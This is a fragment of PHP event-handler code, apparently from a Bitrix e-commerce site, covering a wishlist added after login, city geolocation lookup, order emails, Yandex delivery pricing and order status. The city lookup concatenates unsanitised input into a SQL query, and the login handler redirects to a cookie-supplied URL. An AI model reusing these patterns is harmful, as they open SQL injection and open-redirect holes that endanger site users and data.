                    array('width'=>$width, 'height'=>$height),
                    BX_RESIZE_IMAGE_PROPORTIONAL
                );
                // arshow($_SERVER, true);
                $path = "http://www.mamingorodok.ru//upload/catalog_resized/".$fileName."_".$size.".jpg";


                //unlink($absoluteName); //дописано 06.10 чтобы удалять исходные файлы и не захламлять сервер
            } else {
                $path = "";
            }
        }
        return $path;
    }

    AddEventHandler("main", "OnAfterUserLogin", Array("wishlist", "OnAfterUserLoginLikeItem"));

    class wishlist
    {
        //Добавление товара в список Вам понравилось, после авторизации
        function OnAfterUserLoginLikeItem(&$fields)
        {
            //arshow($_COOKIE);
            //die;
            if (!empty($_COOKIE["idElemToLike"])){
                //arshow($fields);
                //die;
                $el = new CIBlockElement;
                $productID = intval($_COOKIE["idElemToLike"]);

                $PROP = array();
                $PROP["PRODUCT_ID"] = $productID;
                $PROP["STATUS"] = "41";
                $PROP["USER_ID"] = $fields["USER_ID"];

                $arLoadProductArray = Array(
                    "MODIFIED_BY"    => $fields["USER_ID"],
                    "IBLOCK_SECTION_ID" => false,
                    "IBLOCK_ID"      => 8,
                    "PROPERTY_VALUES"=> $PROP,
                    "NAME"           => $productID,
                    "ACTIVE"         => "Y",
                );

                $PRODUCT_ID = $el->Add($arLoadProductArray);
                //  if($PRODUCT_ID = $el->Add($arLoadProductArray))
                //  echo $PRODUCT_ID;
                //  else
                //  echo "Error: ".$el->LAST_ERROR;
                setcookie('idElemToLike', "");
                header('Location: '.$_COOKIE["hrefElemToLike"]);
            }
        }
    }

    //запрос на определение города при входе на сайт. код взят из модуля, но там он почему то не использовался.
    function GetInfoMMByName($cityName){
        global $DB;
        if(COption::GetOptionString("altasib.geobase", "set_sql", "Y") == "Y")
            $DB->Query("SET SQL_BIG_SELECTS=1");
        $dataMM = $DB->Query('SELECT c1.id as CITY_ID, c1.country_id as COUNTRY_ID, c1.name_ru as CITY_RU,
            c1.name_en as CITY_EN, c1.region as REGION_ID, c1.postal_code as POST, c1.latitude, c1.longitude,
            c2.name_ru as COUNTRY_RU, c2.name_en as COUNTRY_EN, c2.code as COUNTRY_CODE
            FROM altasib_geobase_mm_city AS c1
            LEFT JOIN altasib_geobase_mm_country AS c2
            ON COUNTRY_ID = c2.id
            WHERE '
            .' LOWER(c1.name_ru) LIKE "'.$cityName.'" OR LOWER(c1.name_en) LIKE "'.$cityName.'" '
            .' ORDER BY CITY_ID LIMIT 1'
        );

        $arDataCode = $dataMM->Fetch();

        if($arDataCode){
            $arInfo = $arDataCode;
        }

        return $arInfo;
    }

    function sitemap_generate(){

    }

    AddEventHandler("sale", "OnOrderNewSendEmail", "OnOrderUpdateHandler");   // событие срабатывающее после создания заказа
    function OnOrderUpdateHandler($ID,&$eventName,&$arFields)
    {

        $saleOrder = CSaleOrder::GetByID($ID);
        if(empty($arFields["ORDER_USER"])){
            $arFields["ORDER_USER"] = $saleOrder["USER_NAME"];  // добавляем имя в письмо при создании заказа
        }
        // $arOrder = CSaleOrderPropsValue::GetOrderProps($ID)->fetch();
        /*  array("SORT" => "ASC"),
        array("ORDER_ID" => $ID)
        );    */
        /* while ($arProps = $arOrder->Fetch()){
        $ar_prop[] = $arProps;
        }  */
        if(empty($arFields["EMAIL"]) and $arFields["DELIVERY_PRICE"] == 0){
            $arFields["DELIVERY_PRICE"] = "свяжитесь с менеджером";
        }
        //  mail('st@webgk.ru', 'sfddd', implode (' ', $arFields));

        # Свойства заказ, которые должны быть извлечены дополнительно

    }
    // генерация email при созданиии нового заказа
    if ((substr_count($APPLICATION->GetCurPage(),"sale_order_create.php") > 0)  ) { //тут твои условия для проверки страницы
        $APPLICATION->AddHeadScript("/js/generation_email.js"); //тут путь до твоего скрипта

    }
    /*  AddEventHandler("main", "OnBeforeUserAdd", "OnBeforeUserRegisterHandler");

    // описываем саму функцию
    function OnBeforeUserRegisterHandler(&$args)
    {

    $arFilter = array(
    'LOGIN' => $args['LOGIN'],
    );
    $dbRes = CUser::GetList($by = 'ID', $order = 'ASC', $arFilter);
    while($res_user = $dbRes->Fetch()){
    if (!empty($res_user))
    {
    $email = date('U');
    $args["EMAIL"] = $email.'_'.$args["EMAIL"];
    $args["LOGIN"] = $email.'_'.$args["LOGIN"];

    }
    }

    return $args;

    }   */

    //Calculation delivery price for Yandex.Market
    /*
    $productPrice - int,
    $arRules - array
    */
    function calcYandexDelivery ($productPrice, $arRules) {
        foreach ($arRules as $rule) {
            if(!empty($rule["PROPERTY_PRICE_LOW_VALUE"])&&!empty($rule["PROPERTY_PRICE_HIGH_VALUE"])) {
                if (intval($productPrice)>=intval($rule["PROPERTY_PRICE_LOW_VALUE"]) && intval($productPrice)<intval($rule["PROPERTY_PRICE_HIGH_VALUE"])) {
                    $deliveryCost=$rule["PROPERTY_PRICE_DELIVERY_VALUE"];
                }
            } else if (!empty($rule["PROPERTY_PRICE_LOW_VALUE"])) {
                if (intval($productPrice)>=intval($rule["PROPERTY_PRICE_LOW_VALUE"])) {
                    $deliveryCost=$rule["PROPERTY_PRICE_DELIVERY_VALUE"];
                }
            } else if (!empty($rule["PROPERTY_PRICE_HIGH_VALUE"])) {
                if (intval($productPrice)<=intval($rule["PROPERTY_PRICE_HIGH_VALUE"])) {
                    $deliveryCost=$rule["PROPERTY_PRICE_DELIVERY_VALUE"];
                }
            }
        }
        return $deliveryCost;
    }

    //подмена статуса N на u
    AddEventHandler("sale", "OnOrderAdd", "changeOrderStatus");
    function changeOrderStatus($ID, $data) {
        if ($data == "N" || is_array($data)) {
            CSaleOrder::StatusOrder($ID, "u");
        }
    }




?>
